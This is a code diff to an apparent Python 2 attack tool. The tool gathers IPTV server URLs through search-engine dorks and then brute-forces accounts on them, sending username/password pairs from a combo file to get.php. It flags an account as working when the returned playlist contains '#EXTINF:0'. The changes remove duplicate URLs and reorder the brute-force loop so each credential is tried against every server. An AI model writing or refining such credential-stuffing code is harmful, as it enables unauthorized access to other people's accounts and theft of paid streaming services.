@@ -45,11 +45,9 @@ def extractUrls(dorks):
     urls = []
     for dork in open(dorks, 'r').readlines():
         for link in search(dork.strip(), max_results=400):
-            temp.append(link)
-        for url in temp:
-            if url not in urls:
-                urls.append(url)
-    return urls
+            if link not in temp:
+                temp.append(link)
+    return temp
 	
 def checkUrls(urls):
     temp = []
@@ -75,9 +73,9 @@ def aliveOrNot(urls):
     return temp
     
 def bruteAccounts(urls,comboFile):
-    for url in urls:
-        print "[i] Trying URL: http://%s/" %(url)
-        for user in tqdm(open(comboFile, 'r').readlines()):
+    for user in tqdm(open(comboFile, 'r').readlines()):
+        print "[i] Trying combo: %s" %(user)
+        for url in urls:
             try:
                 accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=ts" %(url.strip(), user.strip(), user.strip())
                 if "#EXTINF:0" in get(accountToTry, timeout=5, stream=True).text:
